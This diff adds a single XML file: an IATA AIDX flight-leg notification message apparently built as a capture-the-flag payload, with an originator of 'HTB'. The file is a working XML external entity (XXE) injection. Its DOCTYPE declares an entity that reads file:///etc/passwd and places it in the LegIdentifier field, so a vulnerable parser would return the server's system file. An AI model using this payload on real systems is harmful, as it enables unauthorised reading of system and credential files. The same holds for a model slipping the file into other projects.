@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<IATA_AIDX_FlightLegNotifRQ>
+  <Originator>HTB</Originator>
+  <FlightLeg>
+    <LegIdentifier>&xxe;</LegIdentifier>
+  </FlightLeg>
+</IATA_AIDX_FlightLegNotifRQ>
